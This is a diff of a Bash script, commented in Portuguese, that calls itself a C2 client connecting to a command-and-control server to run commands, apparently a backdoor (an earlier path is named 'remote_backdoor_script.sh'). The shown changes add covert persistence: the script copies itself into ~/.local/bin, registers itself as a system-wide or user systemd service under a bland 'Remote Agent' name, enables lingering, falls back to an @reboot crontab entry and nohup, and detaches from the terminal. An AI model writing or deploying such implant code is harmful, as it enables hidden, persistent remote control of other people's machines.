@@ -1,6 +1,13 @@
 #!/bin/bash
 # Script cliente C2 para Linux
 # Este script conecta-se ao servidor C2 e executa comandos
+# Versão: 1.2 - Com suporte a instalação como serviço
+
+# Detectar se o script está sendo executado como root
+IS_ROOT=false
+if [ "$(id -u)" -eq 0 ]; then
+    IS_ROOT=true
+fi
 
 NGROK_HOST="127.0.0.1"
 NGROK_PORT=5000
@@ -155,21 +162,189 @@ update_config() {
 # Variável para controlar a execução de comandos
 EXECUTING_COMMAND=false
 
-# Criar arquivo de estado para persistência
-PERSIST_FILE="$HOME/.local/remote_backdoor_script.sh"
+# Definir caminhos para persistência
+SCRIPT_NAME="remote_agent.sh"
+USER_HOME="$HOME"
+PERSIST_DIR="$USER_HOME/.local/bin"
+PERSIST_FILE="$PERSIST_DIR/$SCRIPT_NAME"
+LOG_FILE="$USER_HOME/.local/remote_agent.log"
+SYSTEMD_USER_DIR="$USER_HOME/.config/systemd/user"
+SYSTEMD_USER_SERVICE="remote-agent.service"
+SYSTEMD_SYSTEM_DIR="/etc/systemd/system"
+SYSTEMD_SYSTEM_SERVICE="remote-agent.service"
 
 # Salvar script em local persistente
 save_script() {
-    mkdir -p "$HOME/.local"
+    mkdir -p "$PERSIST_DIR"
     cp "$0" "$PERSIST_FILE"
     chmod +x "$PERSIST_FILE"
+    
+    # Criar diretório de log
+    mkdir -p "$(dirname "$LOG_FILE")"
+    touch "$LOG_FILE"
+}
+
+# Verificar se systemd está disponível (para instalação como serviço)
+has_systemd() {
+    if command -v systemctl >/dev/null 2>&1; then
+        return 0
+    else
+        return 1
+    fi
+}
+
+# Criar arquivo de serviço system-wide (requer root)
+create_system_service() {
+    if [ "$IS_ROOT" = false ]; then
+        echo "Precisa ser root para criar um serviço system-wide"
+        return 1
+    fi
+    
+    mkdir -p "$SYSTEMD_SYSTEM_DIR"
+    cat > "$SYSTEMD_SYSTEM_DIR/$SYSTEMD_SYSTEM_SERVICE" << EOF
+[Unit]
+Description=Remote System Agent
+After=network.target
+
+[Service]
+Type=simple
+ExecStart=$PERSIST_FILE
+Restart=always
+RestartSec=5
+StandardOutput=append:$LOG_FILE
+StandardError=append:$LOG_FILE
+
+[Install]
+WantedBy=multi-user.target
+EOF
+
+    systemctl daemon-reload
+    systemctl enable "$SYSTEMD_SYSTEM_SERVICE"
+    systemctl start "$SYSTEMD_SYSTEM_SERVICE"
+    
+    return 0
+}
+
+# Criar arquivo de serviço user-level (não requer root)
+create_user_service() {
+    mkdir -p "$SYSTEMD_USER_DIR"
+    cat > "$SYSTEMD_USER_DIR/$SYSTEMD_USER_SERVICE" << EOF
+[Unit]
+Description=Remote User Agent
+After=network.target
+
+[Service]
+Type=simple
+ExecStart=$PERSIST_FILE
+Restart=always
+RestartSec=5
+StandardOutput=append:$LOG_FILE
+StandardError=append:$LOG_FILE
+
+[Install]
+WantedBy=default.target
+EOF
+
+    systemctl --user daemon-reload
+    systemctl --user enable "$SYSTEMD_USER_SERVICE"
+    systemctl --user start "$SYSTEMD_USER_SERVICE"
+    
+    # Tornar o serviço persistente após logout (se lingering estiver disponível)
+    if [ "$IS_ROOT" = true ]; then
+        loginctl enable-linger "$(logname)" 2>/dev/null || true
+    else
+        # Tentar ativar o lingering para o próprio usuário
+        # Isso pode falhar em alguns sistemas, mas não impede a operação
+        loginctl enable-linger "$USER" 2>/dev/null || true
+    fi
+    
+    return 0
+}
+
+# Instalar script como daemon usando métodos alternativos (se systemd não estiver disponível)
+create_alternative_daemon() {
+    # Método 1: usando nohup
+    nohup "$PERSIST_FILE" > "$LOG_FILE" 2>&1 &
+    
+    # Método 2: adicionar ao crontab para reiniciar após reboot
+    (crontab -l 2>/dev/null || echo "") | grep -v "$PERSIST_FILE" > /tmp/crontab.tmp
+    echo "@reboot $PERSIST_FILE > $LOG_FILE 2>&1" >> /tmp/crontab.tmp
+    crontab /tmp/crontab.tmp
+    rm /tmp/crontab.tmp
+    
+    return 0
+}
+
+# Instalar o serviço de acordo com as permissões disponíveis
+install_service() {
+    # Salvar o script no local persistente
+    save_script
+    
+    # Verificar se podemos usar systemd
+    if has_systemd; then
+        # Tentar instalar como serviço system-wide se for root
+        if [ "$IS_ROOT" = true ]; then
+            echo "Instalando como serviço system-wide..."
+            if create_system_service; then
+                echo "Serviço instalado com sucesso (system-wide)"
+                # Sair do script atual, pois o serviço já está rodando
+                exit 0
+            fi
+        fi
+        
+        # Tentar instalar como serviço user-level se não for root ou o system-wide falhar
+        echo "Instalando como serviço user-level..."
+        if create_user_service; then
+            echo "Serviço instalado com sucesso (user-level)"
+            # Sair do script atual, pois o serviço já está rodando
+            exit 0
+        fi
+    fi
+    
+    # Se systemd não estiver disponível ou falhar, usar método alternativo
+    echo "Instalando usando método alternativo..."
+    if create_alternative_daemon; then
+        echo "Serviço instalado com sucesso (método alternativo)"
+        # Sair do script atual, pois o daemon já está rodando
+        exit 0
+    fi
+    
+    # Se nenhum método funcionar, apenas continuar como processo em primeiro plano
+    echo "Não foi possível instalar como serviço, continuando em primeiro plano"
+    return 1
+}
+
+# Iniciar em segundo plano
+daemonize() {
+    # Verificar se já está rodando como daemon
+    if [ -z "$RUNNING_AS_DAEMON" ]; then
+        # Criar um novo processo em segundo plano
+        RUNNING_AS_DAEMON=1 nohup "$0" > "$LOG_FILE" 2>&1 &
+        echo "Script iniciado em segundo plano com PID $!"
+        exit 0
+    fi
 }
 
 # Loop principal
 main() {
-    # Salvar script para persistência
-    save_script
+    # Remover qualquer estrutura de controle de terminal
+    [ -t 0 ] && exec </dev/null
+    [ -t 1 ] && exec >/dev/null
+    [ -t 2 ] && exec 2>/dev/null
     
+    # Se não for um daemon, tentar instalar como serviço
+    if [ -z "$RUNNING_AS_DAEMON" ]; then
+        # Salvar script para persistência
+        save_script
+        
+        # Tentar instalar como serviço (system-wide ou user-level)
+        install_service
+        
+        # Se falhar, iniciar como daemon
+        daemonize
+    fi
+    
+    # Se chegou aqui, está rodando como daemon ou serviço
     # Enviar relatório de status inicial
     send_status_report
     
